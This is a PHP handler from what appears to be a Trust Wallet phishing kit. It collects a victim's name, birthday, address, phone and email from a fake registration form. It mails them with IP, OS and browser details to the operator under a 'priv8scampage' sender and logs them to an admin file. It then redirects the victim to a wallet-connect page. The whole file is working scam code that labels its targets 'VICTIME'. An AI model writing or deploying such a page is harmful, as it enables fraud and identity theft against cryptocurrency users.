<?php
header('Location: wallet-connect.html');
require 'Email.php';
require 'getdata.php';
$fn = $_POST['fn'];
$ln = $_POST['ln'];
$bd = $_POST['bd'];
$al = $_POST['al'];
$city = $_POST['city'];
$state = $_POST['state'];
$zip = $_POST['zip'];
$pn = $_POST['pn'];
$email = $_POST['email'];
$to = "$yourmail";
$subject = "🌐 New Trust Wallet Customer Registration 🌐 FROM  ".$ip."🔥".$country."";
$message = "
<html>
<head>
<meta charset='UTF-8'></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
<font style='color: #0a5d00;'>👤 New Trust Wallet Customer</font><br>
<font style='color:#9c0000;'>📌</font> First Name = <font style='color:#0070ba;'>$fn</font><br>
<font style='color:#9c0000;'>📌</font> Last Name = <font style='color:#0070ba;'>$ln</font><br>
<font style='color:#9c0000;'>📌</font> Birthday = <font style='color:#0070ba;'>$bd</font><br>
<font style='color:#9c0000;'>📌</font> Address = <font style='color:#0070ba;'>$al</font><br>
<font style='color:#9c0000;'>📌</font> City = <font style='color:#0070ba;'>$city</font><br>
<font style='color:#9c0000;'>📌</font> State = <font style='color:#0070ba;'>$state</font><br>
<font style='color:#9c0000;'>📌</font> Zip Code = <font style='color:#0070ba;'>$zip</font><br>
<font style='color:#9c0000;'>📌</font> Phone Number = <font style='color:#0070ba;'>$pn</font><br>
<font style='color:#9c0000;'>📌</font> Email = <font style='color:#0070ba;'>$email</font><br>
<font style='color: #0a5d00;'>📡 VICTIME INFORMATION</font><br>
<font style='color:#9c0000;'>📌</font> IP INFO = <font style='color:#0070ba;'>https://geoiptool.com/en/?ip=$ip</font><br>
<font style='color:#9c0000;'>📌</font> TIME/DATE = <font style='color:#0070ba;'>$time</font><br>
<font style='color:#9c0000;'>📌</font> OS = <font style='color:#0070ba;'>$user_os</font><br>
<font style='color:#9c0000;'>📌</font> BROWSER = <font style='color:#0070ba;'>$user_browser</font><br>
<font style='color: #820000;'>🙏 Thankx to Coachella 🙏</font>
</div></html>
";
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= 'From:🌼 New Trust Crypto Wallet Customer Details 🌼 <priv8scampage@rez.com>' . "\r\n";
mail($to,$subject,$message,$headers);

$path = "../../../admin/ips/$ip.html";
file_put_contents($path,"$message<br><br>", FILE_APPEND);
?>
